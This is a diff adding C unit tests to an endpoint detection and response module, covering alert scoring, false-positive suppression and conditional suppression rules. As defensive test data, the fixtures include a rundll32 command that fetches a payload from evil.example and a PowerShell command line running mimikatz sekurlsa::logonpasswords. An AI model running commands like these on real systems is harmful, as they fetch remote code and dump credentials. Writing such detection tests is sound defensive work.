@@ -270,6 +270,109 @@ static void test_false_positive_feedback_policy_suppresses_known_tool(void) {
   test_unsetenv("EDR_DETECTION_FP_ROLLBACK_VERSION");
 }
 
+static void test_event_quality_high_signal_emits_alert(void) {
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
+  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s",
+           "detector=yara rule=CobaltStrike score=0.96 proto=http");
+  snprintf(r.net_dst, sizeof(r.net_dst), "%s", "203.0.113.50");
+  r.net_dport = 443u;
+  edr_detection_decision_evaluate(&r, &d);
+  assert(!d.drop);
+  assert(!d.suppress);
+  assert(d.event_quality_score >= 80u);
+  assert(strcmp(d.selection_action, "emit_alert") == 0);
+  assert(strstr(d.signal_reasons, "shellcode_signal") != NULL);
+  assert(d.noise_reasons[0] == '\0');
+  assert(strstr(r.detection_context, "\"event_quality\"") != NULL);
+  assert(strstr(r.detection_context, "\"selection_action\":\"emit_alert\"") != NULL);
+  assert(strstr(r.detection_context, "\"signal_reasons\":[") != NULL);
+}
+
+static void test_event_quality_fp_feedback_downgrades(void) {
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  test_setenv("EDR_DETECTION_FP_FEEDBACK", "FDSensorTaskLaunch.ps1,C:\\Program Files\\FDSecurity\\");
+  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
+  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
+           "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Program Files\\FDSecurity\\FDSensorTaskLaunch.ps1");
+  edr_detection_decision_evaluate(&r, &d);
+  assert(d.suppress);
+  assert(strstr(d.noise_reasons, "false_positive_feedback_policy") != NULL);
+  assert(d.suppression_score > 0u);
+  /* suppress 时不应是 emit_alert；低分应落入 local_only / drop。 */
+  assert(strcmp(d.selection_action, "emit_alert") != 0);
+  assert(strstr(r.detection_context, "\"noise_reasons\":[") != NULL);
+  assert(strstr(r.detection_context, "false_positive_feedback_policy") != NULL);
+  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
+}
+
+static void test_event_quality_p0_forces_alert(void) {
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  r.priority = 0u; /* P0 */
+  r.type = EDR_EVENT_PROTOCOL_SHELLCODE;
+  snprintf(r.script_snippet, sizeof(r.script_snippet), "%s", "detector=yara rule=EternalBlue score=1.0 proto=smb2");
+  edr_detection_decision_evaluate(&r, &d);
+  assert(!d.drop);
+  assert(strcmp(d.selection_action, "emit_alert") == 0);
+}
+
+static void test_conditional_suppression_downgrades_matching_variant(void) {
+  /* 紧凑串：target \037 process \037 action \037 reason \037 contains_all(\035)。
+   * 用八进制转义避免 \x 贪婪吞掉后续十六进制字母。 */
+  const char *rules =
+      "R-LOLBIN-002\037rundll32.exe\037downgrade\037auto_fp_R-LOLBIN-002\037"
+      "davclnt.dll,DavSetCookie\035localhost";
+  test_setenv("EDR_DETECTION_SUPPRESSION_RULES", rules);
+
+  /* 命中条件（rundll32 + davclnt + localhost）→ 降级。 */
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  snprintf(r.process_name, sizeof(r.process_name), "%s", "rundll32.exe");
+  snprintf(r.exe_path, sizeof(r.exe_path), "%s", "C:\\Windows\\System32\\rundll32.exe");
+  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
+           "rundll32.exe C:\\WINDOWS\\system32\\davclnt.dll,DavSetCookie localhost@9843 http://localhost:9843/desktop.ini");
+  edr_detection_decision_evaluate(&r, &d);
+  assert(d.suppress);
+  assert(strstr(d.reason, "conditional_suppression") != NULL);
+  assert(strstr(d.noise_reasons, "conditional_suppression") != NULL);
+
+  /* 同进程但外链（非 localhost）→ 不命中条件 → 保留告警能力。 */
+  EdrBehaviorRecord r2;
+  EdrDetectionDecision d2;
+  init(&r2);
+  snprintf(r2.process_name, sizeof(r2.process_name), "%s", "rundll32.exe");
+  snprintf(r2.exe_path, sizeof(r2.exe_path), "%s", "C:\\Windows\\System32\\rundll32.exe");
+  snprintf(r2.cmdline, sizeof(r2.cmdline), "%s",
+           "rundll32.exe davclnt.dll,DavSetCookie http://evil.example/payload.sct");
+  edr_detection_decision_evaluate(&r2, &d2);
+  assert(strstr(d2.reason, "conditional_suppression") == NULL);
+
+  test_unsetenv("EDR_DETECTION_SUPPRESSION_RULES");
+}
+
+static void test_conditional_suppression_skips_high_signal(void) {
+  const char *rules = "R-X\037powershell.exe\037drop\037r\037encodedcommand";
+  test_setenv("EDR_DETECTION_SUPPRESSION_RULES", rules);
+  /* 凭据转储等高危信号不应被条件化 suppression 误降级。 */
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
+  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
+           "powershell.exe -EncodedCommand SQBFAFgA ; lsass mimikatz sekurlsa::logonpasswords");
+  edr_detection_decision_evaluate(&r, &d);
+  assert(strstr(d.reason, "conditional_suppression") == NULL);
+  test_unsetenv("EDR_DETECTION_SUPPRESSION_RULES");
+}
+
 static void test_ransom_control_threshold_context(void) {
   EdrBehaviorRecord r;
   EdrDetectionDecision d;
@@ -313,6 +416,11 @@ int main(void) {
   test_process_tree_context_correlates_parent_child();
   test_file_policy_allowlist_suppresses_known_rmm();
   test_false_positive_feedback_policy_suppresses_known_tool();
+  test_event_quality_high_signal_emits_alert();
+  test_event_quality_fp_feedback_downgrades();
+  test_event_quality_p0_forces_alert();
+  test_conditional_suppression_downgrades_matching_variant();
+  test_conditional_suppression_skips_high_signal();
   test_ransom_control_threshold_context();
   puts("detection_decision ok");
   return 0;
